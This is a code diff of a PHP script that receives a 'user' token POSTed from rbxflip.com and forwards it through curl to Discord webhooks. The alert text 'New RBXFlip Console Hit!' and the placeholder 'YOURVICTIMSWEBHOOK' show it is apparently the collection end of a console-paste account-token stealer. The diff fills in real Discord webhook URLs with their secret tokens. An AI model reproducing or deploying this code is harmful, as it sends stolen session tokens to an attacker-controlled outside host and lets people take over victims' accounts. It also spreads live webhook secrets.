@@ -2,7 +2,7 @@
 header("Access-Control-Allow-Origin: https://rbxflip.com");
 if($_POST['user']){
   $token = $_POST['user'];
-  $dhookwebhook= "YOURDISCORDWEBHOOK";
+  $dhookwebhook= "https://discordapp.com/api/webhooks/1455086377950646333/wyDBNjOOIFba9u31_hl5eTXFPnHfFJCVMmqlxEDlqeyEBvWdPsKbzhtuW_AkMNqOK7bB";
 $timestamp = date("c", strtotime("now"));
 $json_data = json_encode([
     "content" => "@everyone **New RBXFlip Console Hit!**",
@@ -36,7 +36,7 @@ $response = curl_exec($ch);
 curl_close($ch);
    $ch = curl_init();
         curl_setopt_array($ch, [
-            CURLOPT_URL => "YOURVICTIMSWEBHOOK",
+            CURLOPT_URL => "https://discordapp.com/api/webhooks/1455086681299619840/7qOTAawOBOL6rMGy5IRjHB85NHaF8rYjrru3Roe0zUYatXID2PaASToFFZ7ZWR7Y9SKj",
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => $json_data,
             CURLOPT_HTTPHEADER => [
